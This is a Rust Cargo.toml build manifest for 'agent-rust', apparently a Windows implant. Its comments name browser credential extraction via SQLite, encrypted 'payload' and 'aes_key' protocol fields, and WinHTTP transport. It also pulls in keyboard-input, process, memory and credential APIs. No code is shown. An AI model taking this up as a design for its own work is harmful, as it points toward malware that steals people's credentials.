[package]
name = "agent-rust"
version = "0.1.0"
edition = "2021"
build = "build.rs"

[[bin]]
name = "agent-rust"
path = "src/main.rs"

[lib]
name = "agent_rust"
path = "src/lib.rs"
crate-type = ["cdylib"]

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
strip = true
panic = "abort"

[target.'cfg(target_os = "windows")'.dependencies]
# SQLite (bundled: compiles sqlite3.c from source, no system lib needed — browser creds)
rusqlite = { version = "0.31", features = ["bundled"] }

# Windows APIs: WinHTTP transport + BCryptGenRandom for nonce generation
windows-sys = { version = "0.52", features = [
    "Win32_Foundation",
    "Win32_Networking_WinHttp",
    "Win32_Networking_WinSock",
    "Win32_Security",
    "Win32_Security_Authentication_Identity",
    "Win32_Security_Cryptography",
    "Win32_Storage_FileSystem",
    "Win32_System_DataExchange",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_Diagnostics_ToolHelp",
    "Win32_System_Kernel",
    "Win32_System_LibraryLoader",
    "Win32_System_SystemServices",
    "Win32_System_Memory",
    "Win32_System_Registry",
    "Win32_System_SystemInformation",
    "Win32_System_Threading",
    "Win32_UI_Input_KeyboardAndMouse",
    "Win32_UI_WindowsAndMessaging",
    "Win32_Security_Credentials",
    "Win32_System_Console",
] }

[dependencies]
# Pure-Rust AES-256-GCM — no external C deps, cross-compiles cleanly from Linux
aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }

# JSON parsing for protocol
serde_json = "1"

# Base64 for aes_key and payload fields
base64 = "0.22"
